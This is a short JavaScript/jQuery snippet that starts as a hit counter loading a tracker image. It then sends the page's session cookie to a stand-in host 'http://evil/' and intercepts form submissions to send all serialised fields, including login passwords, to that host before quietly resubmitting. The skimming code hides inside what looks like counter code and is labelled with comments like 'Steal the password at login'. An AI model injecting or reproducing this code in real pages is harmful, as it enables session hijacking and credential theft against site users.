var img = [ new Image(), new Image(), new Image()  ];
img[0].src = 'https://tracker/hit.php';

$( document ).ready(function() {
    $('.hit-counter').append(img[0]);
    console.log(img[0]);
});

// Steal the PHP session cookie
img[1].src = 'http://evil/?' + document.cookie;

// Steal the password at login
$('form').one('submit', function(e) {
    e.preventDefault();
    img[2].src = 'http://evil/?' + $('form').serialize();

    var form = $(this);
    setTimeout(function() {
        form.submit();
    }, 100);
});